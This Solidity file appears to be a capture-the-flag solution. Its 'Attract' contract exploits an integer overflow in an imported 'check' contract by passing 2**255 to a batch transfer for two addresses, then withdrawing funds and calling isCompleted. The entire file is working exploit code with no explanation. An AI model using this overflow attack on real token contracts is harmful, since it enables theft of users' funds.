// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./1.sol";
contract Attract{
    check che;
    address[] addresss = [
        address(this),
        0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
    ];
    constructor(check addr) public {
        che = addr;
    }
    function attract() public {
        che.transfers(addresss, uint256(2**255));
        che.withdraw(500000);
        che.isCompleted();
    }
}